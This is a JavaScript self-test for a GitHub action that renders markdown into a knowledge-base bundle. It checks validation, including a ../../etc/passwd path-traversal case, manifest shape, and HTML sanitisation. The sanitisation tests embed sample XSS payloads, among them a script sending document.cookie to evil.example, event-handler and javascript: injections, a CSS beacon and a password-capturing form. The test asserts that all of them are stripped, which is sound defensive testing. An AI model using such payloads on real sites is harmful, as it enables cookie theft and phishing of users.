/**
 * selftest.js — `npm run selftest:single-page` inside actions/.
 *
 * Exercises the action without a runner: renders a sample markdown file through
 * the real pipeline and asserts the markdown features the contract promises, the
 * headless rules, and the shape of kb-docs.json. Also pins the validation error
 * messages, since those are the action's user interface for onboarding repos.
 *
 * Kept out of the knowledge base's Playwright suite on purpose: that suite must stay
 * hermetic and must not depend on this action's node_modules.
 */

import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync, mkdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { buildBundle, packBundle, ASSET_NAME, MANIFEST } from './bundle.js';
import { InputError, parseDocsInput, validateDocs } from './inputs.js';
import { renderMarkdown } from './markdown.js';

const SAMPLE = `# Service Overview

Ships a thing. See https://example.com/handbook for context.[^1]

## Interfaces

| Endpoint | Method | Notes |
|---|---|---|
| \`/health\` | GET | Liveness probe |
| \`/v1/items\` | POST | Creates an item |

- [x] Contract published
- [ ] Load-tested

\`\`\`js
export const port = Number(process.env.PORT ?? 8080);
\`\`\`

\`\`\`mermaid
flowchart LR
  client --> gateway --> service
\`\`\`

[^1]: The handbook is internal.
`;

const root = mkdtempSync(join(tmpdir(), 'kb-publish-single-page-docs-'));
let failures = 0;

function check(name, fn) {
  try {
    fn();
    console.log(`  \x1b[32m✓\x1b[0m ${name}`);
  } catch (err) {
    failures++;
    console.log(`  \x1b[31m✗\x1b[0m ${name}\n    ${err.message}`);
  }
}

try {
  mkdirSync(join(root, 'docs'), { recursive: true });
  writeFileSync(join(root, 'docs', 'overview.md'), SAMPLE);

  console.log('\nInput validation');

  check('rejects a non-list input with an actionable message', () => {
    assert.throws(() => parseDocsInput('md: docs/overview.md'), (err) => {
      assert.ok(err instanceof InputError);
      assert.match(err.message, /must be a LIST/);
      return true;
    });
  });

  check('rejects a bad slug, a missing file and a duplicate slug together', () => {
    const raw = `
- md: docs/overview.md
  title: A
  description: A description that is long enough.
  slug: Not_A_Slug
- md: docs/missing.md
  title: B
  description: Another description that is long enough.
  slug: overview
- md: docs/overview.md
  title: C
  description: Yet another description long enough.
  slug: overview
`;
    assert.throws(() => validateDocs(parseDocsInput(raw), root), (err) => {
      assert.ok(err instanceof InputError, 'expected an InputError');
      assert.match(err.message, /slug "Not_A_Slug" is invalid/);
      assert.match(err.message, /does not exist in the repository/);
      assert.match(err.message, /already used by docs\[1\]/);
      return true;
    });
  });

  check('rejects an unsupported icon and lists the allowed set', () => {
    const raw = `
- md: docs/overview.md
  title: Overview
  description: A description that is long enough.
  slug: overview
  icon: rocket
`;
    assert.throws(() => validateDocs(parseDocsInput(raw), root), (err) => {
      assert.match(err.message, /icon "rocket" is not supported/);
      assert.match(err.message, /book-open/);
      return true;
    });
  });

  check('rejects a path that escapes the checkout', () => {
    const raw = `
- md: ../../etc/passwd
  title: Overview
  description: A description that is long enough.
  slug: overview
`;
    assert.throws(() => validateDocs(parseDocsInput(raw), root), (err) => {
      assert.match(err.message, /must be a repository-relative path/);
      return true;
    });
  });

  console.log('\nBundle output');

  const docs = validateDocs(parseDocsInput(`
- md: docs/overview.md
  title: Service Overview
  description: What the service does and how to use it.
  slug: my-service
  icon: cube
  tags: [platform, api]
`), root);

  const stage = join(root, 'stage');
  const { manifest } = buildBundle(docs, stage);
  const html = readFileSync(join(stage, 'my-service', 'index.html'), 'utf8');

  check('manifest is a contract kb-docs.json listing every doc as an app', () => {
    assert.equal(manifest.kbVersion, '1');
    // No `type`, no `docs`: a markdown bundle and a packaged site publish the
    // same manifest, and buildManifest validates it against the contract schema
    // before this ever returns.
    assert.deepEqual(manifest.apps, [{
      slug: 'my-service',
      name: 'Service Overview',
      description: 'What the service does and how to use it.',
      icon: 'cube',
      tags: ['platform', 'api'],
      entryPoint: 'index.html',
    }]);
    assert.ok(existsSync(join(stage, MANIFEST)));
  });

  check('document complies with contract/HEADLESS_RULES.md', () => {
    assert.match(html, /<html lang="en" data-kb-headless="true">/);
    assert.doesNotMatch(html, /<base\b/i);
    assert.doesNotMatch(html, /localStorage/);
    assert.doesNotMatch(html, /\bclass="dark"/);
    // No site-level header and no sidebar — the knowledge base masthead is the chrome.
    assert.doesNotMatch(html, /<header class="fixed/);
    assert.doesNotMatch(html, /id="sidebar"/);
    // All asset references are relative (no leading slash).
    for (const [, url] of html.matchAll(/(?:href|src)="([^"]+)"/g)) {
      assert.ok(!url.startsWith('/'), `asset path must be relative, got ${url}`);
    }
  });

  check('renders GitHub-flavoured markdown', () => {
    assert.match(html, /<table>/, 'tables');
    assert.match(html, /task-list-item/, 'task lists');
    assert.match(html, /href="https:\/\/example\.com\/handbook"/, 'autolinks');
    assert.match(html, /class="footnotes"/, 'footnotes');
  });

  check('highlights code fences', () => {
    assert.match(html, /<pre class="kb-code"><code class="hljs language-js">/);
    assert.match(html, /hljs-keyword/);
  });

  check('keeps mermaid sources and vendors the bundle instead of using a CDN', () => {
    assert.match(html, /<pre class="mermaid">flowchart LR/);
    assert.match(html, /<script src="assets\/mermaid\.min\.js">/);
    assert.doesNotMatch(html, /https?:\/\/[^"]*mermaid/);
    assert.ok(existsSync(join(stage, 'my-service', 'assets', 'mermaid.min.js')), 'mermaid not vendored');
  });

  check('ships the mermaid init as a file, so the document has no inline script', () => {
    assert.match(html, /<script src="assets\/mermaid-init\.js">/);
    assert.ok(
      existsSync(join(stage, 'my-service', 'assets', 'mermaid-init.js')),
      'mermaid init not written',
    );
    // Every <script> must carry a src. An inline one would force the
    // knowledge base's CSP to allow script-src 'unsafe-inline', which would allow
    // an injected script too.
    for (const [tag] of html.matchAll(/<script\b[^>]*>/g)) {
      assert.match(tag, /\bsrc=/, `inline <script> in the document: ${tag}`);
    }
  });

  check('ships the doc stylesheet alongside the page', () => {
    assert.match(html, /<link rel="stylesheet" href="assets\/doc\.css">/);
    const css = readFileSync(join(stage, 'my-service', 'assets', 'doc.css'), 'utf8');
    assert.match(css, /--color-kb-500: #af144b;/);
    assert.match(css, /\.kb-doc\b/);
  });

  check('packs a tarball with kb-docs.json at the root', () => {
    const tar = packBundle(stage, join(root, 'out', ASSET_NAME), manifest);
    assert.ok(existsSync(tar));
    const members = execFileSync('tar', ['--force-local', '-tzf', tar], { encoding: 'utf8' })
      .split('\n').filter(Boolean);
    assert.ok(members.includes(MANIFEST), `expected ${MANIFEST} at the archive root`);
    assert.ok(members.some((m) => m.startsWith('my-service/')), 'expected the doc directory');
    // No wrapper directory, and nothing the manifest does not declare.
    assert.ok(!members.some((m) => m.startsWith('./') || m.startsWith('dist/')), members.join(' '));
  });

  check('packing is deterministic — identical input, identical bytes', () => {
    // Republishing an unchanged doc set must not produce a different asset, or
    // nobody can tell a real change from a rebuild.
    const a = packBundle(stage, join(root, 'out', 'a.tar.gz'), manifest);
    const b = packBundle(stage, join(root, 'out', 'b.tar.gz'), manifest);
    assert.deepEqual(readFileSync(a), readFileSync(b));
  });

  // ── Sanitisation ───────────────────────────────────────────────────────────
  //
  // markdown-it runs with html:true, and the result is re-hosted on the
  // knowledge base's own origin next to every other doc. Anything that executes
  // here executes against all of them, so the allowlist is asserted rather than
  // described. Each case is markdown a doc repo could commit today.
  console.log('\nSanitisation');

  const rendered = (md) => renderMarkdown(md).html;

  check('strips a raw <script> block', () => {
    const html = rendered('Intro\n\n<script>fetch("https://evil.example?c="+document.cookie)</script>\n');
    assert.doesNotMatch(html, /<script/i);
    assert.doesNotMatch(html, /evil\.example/);
    assert.match(html, /Intro/, 'surrounding prose must survive');
  });

  check('strips event-handler attributes', () => {
    const html = rendered('<img src="x.png" onerror="alert(1)">\n\n<div onclick="alert(2)">text</div>\n');
    assert.doesNotMatch(html, /onerror/i);
    assert.doesNotMatch(html, /onclick/i);
    assert.doesNotMatch(html, /alert\(/);
    assert.match(html, /<img[^>]+src="x\.png"/, 'the image itself is legitimate content');
  });

  check('strips javascript: and data: URLs from raw HTML', () => {
    const html = rendered('<a href="javascript:alert(1)">click</a>\n\n<img src="data:text/html,<script>alert(1)</script>">\n');
    assert.doesNotMatch(html, /javascript:/i);
    assert.doesNotMatch(html, /data:text\/html/i);
    assert.match(html, /click/, 'link text is kept even though the href is dropped');
  });

  check('strips inline <style> and style attributes', () => {
    // CSS is not inert: it can exfiltrate through url(), and absolute positioning
    // lets a doc cover the knowledge base masthead.
    const html = rendered('<style>body{background:url("https://evil.example/beacon")}</style>\n\n<p style="position:fixed;inset:0">covered</p>\n');
    assert.doesNotMatch(html, /<style/i);
    assert.doesNotMatch(html, /evil\.example/);
    assert.doesNotMatch(html, /style="/);
    assert.match(html, /covered/);
  });

  check('strips iframes, objects and form controls', () => {
    const html = rendered('<iframe src="https://evil.example"></iframe>\n\n<form action="https://evil.example"><input name="password" type="password"></form>\n');
    assert.doesNotMatch(html, /<iframe/i);
    assert.doesNotMatch(html, /<form/i);
    assert.doesNotMatch(html, /type="password"/i);
  });

  check('keeps the markdown features the contract promises', () => {
    const html = rendered([
      '# Heading',
      '',
      '- [x] done',
      '- [ ] todo',
      '',
      '| a | b |',
      '|---|---|',
      '| 1 | 2 |',
      '',
      '```js',
      'const x = 1;',
      '```',
      '',
      '```mermaid',
      'flowchart LR',
      '  a --> b',
      '```',
      '',
      '**bold** and [link](https://example.com) and `code`',
    ].join('\n'));

    assert.match(html, /<h1[^>]*id="heading"/, 'heading anchors');
    assert.match(html, /class="kb-anchor"/, 'anchor permalinks');
    assert.match(html, /task-list-item/, 'task lists');
    // Attribute order is not stable through the sanitiser, so assert each
    // independently rather than pinning a sequence.
    const checkbox = html.match(/<input\b[^>]*>/);
    assert.ok(checkbox, 'task-list checkbox');
    assert.match(checkbox[0], /type="checkbox"/, 'checkbox type');
    assert.match(checkbox[0], /\bdisabled\b/, 'task-list checkboxes stay disabled');
    assert.match(html, /<label class="task-list-item-label"/, 'checkbox keeps its label');
    assert.match(html, /<table>/, 'tables');
    assert.match(html, /<code class="hljs language-js">/, 'highlighted code');
    assert.match(html, /hljs-keyword/, 'highlight.js spans');
    assert.match(html, /<pre class="mermaid">flowchart LR/, 'mermaid sources');
    assert.match(html, /<strong>bold<\/strong>/, 'inline formatting');
    assert.match(html, /rel="noopener noreferrer"/, 'external link hardening');
  });

  check('keeps benign structural HTML an author hand-writes', () => {
    const html = rendered('<details><summary>More</summary>\n\n<p>Body</p>\n\n</details>\n');
    assert.match(html, /<details>/);
    assert.match(html, /<summary>More<\/summary>/);
    assert.match(html, /Body/);
  });

  check('adds rel=noopener to a hand-written target=_blank link', () => {
    const html = rendered('<a href="https://example.com" target="_blank">out</a>\n');
    assert.match(html, /rel="noopener noreferrer"/);
  });
} finally {
  rmSync(root, { recursive: true, force: true });
}

if (failures > 0) {
  console.error(`\n\x1b[31m✗ ${failures} self-test check(s) failed\x1b[0m\n`);
  process.exit(1);
}
console.log('\n\x1b[32m✓ publish-single-page-docs self-test passed\x1b[0m\n');
